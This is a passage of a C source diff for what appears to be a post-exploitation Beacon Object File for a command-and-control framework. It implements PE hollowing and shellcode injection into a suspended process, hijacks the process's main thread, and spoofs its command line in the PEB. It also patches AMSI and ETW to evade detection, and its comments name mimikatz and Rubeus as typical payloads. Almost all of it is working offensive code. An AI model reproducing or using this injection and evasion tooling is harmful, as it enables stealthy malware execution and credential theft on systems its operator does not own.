+        DWORD entryCount = (blockSize - 8) / 2;
+        WORD *entries = (WORD*)(pBlock + 8);
+
+        for (DWORD j = 0; j < entryCount; j++) {
+            BYTE type = (BYTE)(entries[j] >> 12);
+            WORD offset = entries[j] & 0x0FFF;
+            DWORD patchRva = pageRva + offset;
+
+            if (type == IMAGE_REL_BASED_DIR64) {
+                if (patchRva + 8 > peSize) continue;
+                ULONG_PTR *pPatch = (ULONG_PTR*)(peData + patchRva);
+                *pPatch += delta;
+            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
+                if (patchRva + 4 > peSize) continue;
+                DWORD *pPatch = (DWORD*)(peData + patchRva);
+                *pPatch += (DWORD)delta;
+            } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
+                /* padding, skip */
+            }
         }
+        pBlock += blockSize;
+        processed += blockSize;
     }
 
-    /* Set proper section protections */
-    AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNt, pSec);
+    return TRUE;
+}
 
-    /* Update thread context — set entry point + PEB image base */
+/* ================================================================
+ *  Execute TLS callbacks
+ *
+ *  We inject a small stub into the remote process that calls each
+ *  TLS callback with (ImageBase, DLL_PROCESS_ATTACH, NULL).
+ *  For simplicity: if TLS callbacks exist, we warn but skip them.
+ *  Most offensive PEs (mimikatz, Rubeus, etc.) don't use TLS.
+ * ================================================================ */
+
+static void WarnTLSCallbacks(BYTE *peData, PIMAGE_NT_HEADERS pNt) {
+    IMAGE_DATA_DIRECTORY tlsDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+    if (tlsDir.Size == 0 || tlsDir.VirtualAddress == 0) return;
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[!] PE has TLS directory — callbacks will NOT be invoked");
+    BeaconPrintf(CALLBACK_OUTPUT, "    Most offensive tools work fine without them");
+}
+
+/* ================================================================
+ *  PE Hollowing — proper implementation
+ *
+ *  1. Read remote PEB → get original ImageBase
+ *  2. NtUnmapViewOfSection to remove original image
+ *  3. VirtualAllocEx at original base (or fallback)
+ *  4. Resolve imports locally (uses per-boot ASLR property)
+ *  5. Apply relocations if base changed
+ *  6. Write headers + sections
+ *  7. Set section protections
+ *  8. Update PEB ImageBase
+ *  9. Set thread context entry point
+ *  10. Spoof command line
+ *  11. Patch AMSI + ETW
+ * ================================================================ */
+
+static BOOL HollowWithPE(HANDLE hProcess, HANDLE hThread, BYTE *peData, DWORD peSize,
+                         const char *argsA, const char *spawntoA) {
+    PIMAGE_NT_HEADERS pNt = NULL;
+    if (!ValidatePE(peData, peSize, &pNt))
+        return FALSE;
+
+    WarnTLSCallbacks(peData, pNt);
+
+    /* Step 1: Read original ImageBase from remote PEB */
     CONTEXT ctx;
-    _memset(&ctx, 0, sizeof(ctx));
+    xmemset(&ctx, 0, sizeof(ctx));
     ctx.ContextFlags = CONTEXT_ALL;
 
     if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
@@ -586,42 +759,140 @@ static BOOL HollowWithPE(HANDLE hProcess, HANDLE hThread, BYTE *peData, DWORD pe
         return FALSE;
     }
 
-    /* Update PEB ImageBase */
-    ULONG_PTR pebImageBase = ctx.Rdx + offsetof(PEB, Reserved3[1]);
-    ULONG_PTR newBase = (ULONG_PTR)pRemote;
-    KERNEL32$WriteProcessMemory(hProcess, (PVOID)pebImageBase, &newBase, sizeof(ULONG_PTR), &bw);
+    /* RDX = PEB address on x64 for suspended process */
+    ULONG_PTR pebAddr = ctx.Rdx;
+    ULONG_PTR origImageBase = 0;
+    SIZE_T br = 0;
 
-    /* Set RCX to entry point */
+    /* PEB + 0x10 = ImageBaseAddress on x64 */
+    if (!KERNEL32$ReadProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &origImageBase, sizeof(origImageBase), &br)) {
+        BeaconPrintf(CALLBACK_ERROR, "Read PEB ImageBase: %lu", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Original image base: 0x%p", (void*)origImageBase);
+
+    /* Step 2: Unmap original image */
+    NTSTATUS st = NTDLL$NtUnmapViewOfSection(hProcess, (PVOID)origImageBase);
+    if (st != 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] NtUnmapViewOfSection: 0x%lx (continuing anyway)", st);
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Original image unmapped");
+    }
+
+    /* Step 3: Allocate at preferred base, fall back to any address */
+    ULONG_PTR preferredBase = pNt->OptionalHeader.ImageBase;
+    BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
+        (PVOID)preferredBase,
+        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!pRemote) {
+        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
+            (PVOID)origImageBase,
+            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    }
+
+    if (!pRemote) {
+        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, NULL,
+            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    }
+
+    if (!pRemote) {
+        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated 0x%lx bytes at 0x%p", pNt->OptionalHeader.SizeOfImage, pRemote);
+
+    /* Step 4: Resolve imports LOCALLY before writing to remote process.
+       Must happen before relocations so import thunks are filled first. */
+    if (!ResolveImports(peData, peSize, pNt)) {
+        BeaconPrintf(CALLBACK_ERROR, "Import resolution failed — aborting");
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Imports resolved");
+
+    /* Step 5: Apply relocations if base changed */
+    ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
+    if (delta != 0) {
+        if (!ApplyRelocations(peData, peSize, pNt, delta)) {
+            BeaconPrintf(CALLBACK_ERROR, "Relocation failed");
+            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+            return FALSE;
+        }
+        pNt->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Relocations applied (delta=0x%llx)", (unsigned long long)delta);
+    }
+
+    /* Step 6: Write headers */
+    SIZE_T bw = 0;
+    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, peData,
+            pNt->OptionalHeader.SizeOfHeaders, &bw)) {
+        BeaconPrintf(CALLBACK_ERROR, "Write headers: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    /* Step 6b: Write sections */
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (pSec[i].SizeOfRawData == 0) continue;
+        if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
+                peData + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, &bw)) {
+            BeaconPrintf(CALLBACK_ERROR, "Write section %d: %lu", i, KERNEL32$GetLastError());
+            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+            return FALSE;
+        }
+    }
+
+    /* Step 7: Set proper section protections */
+    if (!AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNt, pSec)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Some section protections failed (continuing)");
+    }
+
+    /* Flush instruction cache */
+    KERNEL32$FlushInstructionCache(hProcess, pRemote, pNt->OptionalHeader.SizeOfImage);
+
+    /* Step 8: Update PEB ImageBase */
+    ULONG_PTR newBase = (ULONG_PTR)pRemote;
+    if (!KERNEL32$WriteProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &newBase, sizeof(newBase), &bw)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB ImageBase update failed: %lu", KERNEL32$GetLastError());
+    }
+
+    /* Step 9: Set RCX = entry point */
     ctx.Rcx = (DWORD64)(pRemote + pNt->OptionalHeader.AddressOfEntryPoint);
 
     if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
         BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
         return FALSE;
     }
 
-    /* Spoof command line in PEB — use actual spawnto basename */
+    /* Step 10: Spoof command line in PEB */
     if (argsA && argsA[0]) {
         const char *basename = spawntoA;
         const char *s = spawntoA;
         while (*s) { if (*s == '\\' || *s == '/') basename = s + 1; s++; }
 
         char realCmd[4096];
-        _memset(realCmd, 0, sizeof(realCmd));
+        xmemset(realCmd, 0, sizeof(realCmd));
         MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", basename, argsA);
-        SpoofCommandLine(hProcess, realCmd);
+        if (SpoofCommandLine(hProcess, realCmd))
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Command line spoofed");
     }
 
-    /* Patch AMSI + ETW before resume */
+    /* Step 11: Patch AMSI + ETW */
     PatchAMSI(hProcess);
     PatchETW(hProcess);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] PE hollowed at 0x%p, entry 0x%p",
-                 pRemote, (void*)ctx.Rcx);
+                 pRemote, (void*)(ULONG_PTR)ctx.Rcx);
     return TRUE;
 }
 
 /* ================================================================
- *  Shellcode injection
+ *  Shellcode injection (unchanged — this path was already correct)
  * ================================================================ */
 
 static BOOL InjectShellcode(HANDLE hProcess, HANDLE hThread, BYTE *scData, DWORD scSize) {
@@ -640,23 +911,24 @@ static BOOL InjectShellcode(HANDLE hProcess, HANDLE hThread, BYTE *scData, DWORD
     SIZE_T bw = 0;
     if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, scData, scSize, &bw)) {
         BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory shellcode: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
         return FALSE;
     }
 
     DWORD oldProt = 0;
     KERNEL32$VirtualProtectEx(hProcess, pRemote, scSize, PAGE_EXECUTE_READ, &oldProt);
 
+    KERNEL32$FlushInstructionCache(hProcess, pRemote, scSize);
+
     PatchETW(hProcess);
 
-    /* Hijack the suspended main thread — set RIP to shellcode, then resume.
-       This avoids CreateRemoteThread (extra detection surface) and ensures
-       the process has a running main thread. */
     CONTEXT ctx;
-    _memset(&ctx, 0, sizeof(ctx));
+    xmemset(&ctx, 0, sizeof(ctx));
     ctx.ContextFlags = CONTEXT_ALL;
 
     if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
         BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
         return FALSE;
     }
 
@@ -664,10 +936,11 @@ static BOOL InjectShellcode(HANDLE hProcess, HANDLE hThread, BYTE *scData, DWORD
 
     if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
         BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
         return FALSE;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode injected at 0x%p (%lu bytes), thread hijacked", pRemote, scSize);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode at 0x%p (%lu bytes), thread hijacked", pRemote, scSize);
     return TRUE;
 }
 
@@ -711,23 +984,9 @@ static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
     return buf;
 }
 
-
 /* ================================================================
  *  BOF entry point
  * ================================================================ */
-
-/* Argument packing from .axs:
- *   int     mode          (0=PE, 1=shellcode)
- *   int     source        (0=bytes in arg, 1=path on target)
- *   int     noOutput      (0=capture, 1=no output)
- *   int     timeout_ms
- *   int     blockDlls     (0=no, 1=yes)
- *   int     noPpid        (0=spoof, 1=no spoof)
- *   cstr    spawnto       (empty = default)
- *   cstr    args          (PE arguments, can be empty)
- *   cstr    localPath     (if source=1, path on target)
- *   bytes   peBytes       (if source=0, raw PE/shellcode bytes)
- */
 
 void go(char *rawArgs, int rawLen) {
     datap parser;
@@ -752,14 +1011,13 @@ void go(char *rawArgs, int rawLen) {
     int peDataLen = 0;
     char *peData  = BeaconDataExtract(&parser, &peDataLen);
 
-    /* Defaults */
     const char *spawntoA = DEFAULT_SPAWNTO_A;
     if (spawnto && spawnto[0]) spawntoA = spawnto;
 
     if (timeoutMs <= 0) timeoutMs = DEFAULT_TIMEOUT_MS;
     BOOL wantOutput = (noOutput == OUTPUT_NO) ? FALSE : TRUE;
 
-    /* Get PE/shellcode bytes */
+    /* Get payload bytes */
     BYTE *payloadData = NULL;
     DWORD payloadSize = 0;
     BOOL freePayload = FALSE;
@@ -782,13 +1040,31 @@ void go(char *rawArgs, int rawLen) {
         payloadSize = (DWORD)peDataLen;
     }
 
+    /* For PE mode, we need a writable copy since we modify IAT + relocations in place */
+    BYTE *workingCopy = NULL;
+    if (mode == MODE_PE) {
+        workingCopy = (BYTE*)KERNEL32$LocalAlloc(0x40, payloadSize);
+        if (!workingCopy) {
+            BeaconPrintf(CALLBACK_ERROR, "LocalAlloc for working copy: %lu", KERNEL32$GetLastError());
+            if (freePayload) KERNEL32$LocalFree(payloadData);
+            return;
+        }
+        xmemcpy(workingCopy, payloadData, payloadSize);
+        if (freePayload) {
+            KERNEL32$LocalFree(payloadData);
+            payloadData = NULL;
+        }
+        freePayload = TRUE;
+        payloadData = workingCopy;
+    }
+
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Mode: %s | Output: %s | Timeout: %ds | Spawnto: %s",
                  mode == MODE_PE ? "PE" : "Shellcode",
                  wantOutput ? "yes" : "no",
                  timeoutMs / 1000,
                  spawntoA);
 
-    /* Compute real command line length so fake can be padded to fit */
+    /* Compute real command line length for PEB padding */
     int realCmdMinBytes = 0;
     if (mode == MODE_PE && args && args[0]) {
         const char *bn = spawntoA;
@@ -814,7 +1090,7 @@ void go(char *rawArgs, int rawLen) {
                              payloadData, payloadSize);
     }
 
-    if (freePayload) {
+    if (freePayload && payloadData) {
         KERNEL32$LocalFree(payloadData);
         payloadData = NULL;
     }
@@ -825,7 +1101,7 @@ void go(char *rawArgs, int rawLen) {
         return;
     }
 
-    /* Resume — both PE hollowing and shellcode hijack the main thread */
+    /* Resume thread */
     if (KERNEL32$ResumeThread(sctx.pi.hThread) == (DWORD)-1) {
         BeaconPrintf(CALLBACK_ERROR, "ResumeThread: %lu", KERNEL32$GetLastError());
         SpawnCleanup(&sctx, FALSE);
@@ -841,11 +1117,11 @@ void go(char *rawArgs, int rawLen) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] No-output mode, child running detached");
     }
 
-    /* Cleanup */
-    if (sctx.hPipeOutRead) { KERNEL32$CloseHandle(sctx.hPipeOutRead); sctx.hPipeOutRead = NULL; }
-    if (sctx.hPipeInWrite) { KERNEL32$CloseHandle(sctx.hPipeInWrite); sctx.hPipeInWrite = NULL; }
-    if (sctx.pi.hProcess)  { KERNEL32$CloseHandle(sctx.pi.hProcess);  sctx.pi.hProcess = NULL; }
-    if (sctx.pi.hThread)   { KERNEL32$CloseHandle(sctx.pi.hThread);   sctx.pi.hThread = NULL; }
+    /* Final cleanup — handles only, child process already ran */
+    if (sctx.hPipeOutRead) { KERNEL32$CloseHandle(sctx.hPipeOutRead); }
+    if (sctx.hPipeInWrite) { KERNEL32$CloseHandle(sctx.hPipeInWrite); }
+    if (sctx.pi.hProcess)  { KERNEL32$CloseHandle(sctx.pi.hProcess); }
+    if (sctx.pi.hThread)   { KERNEL32$CloseHandle(sctx.pi.hThread); }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
 }
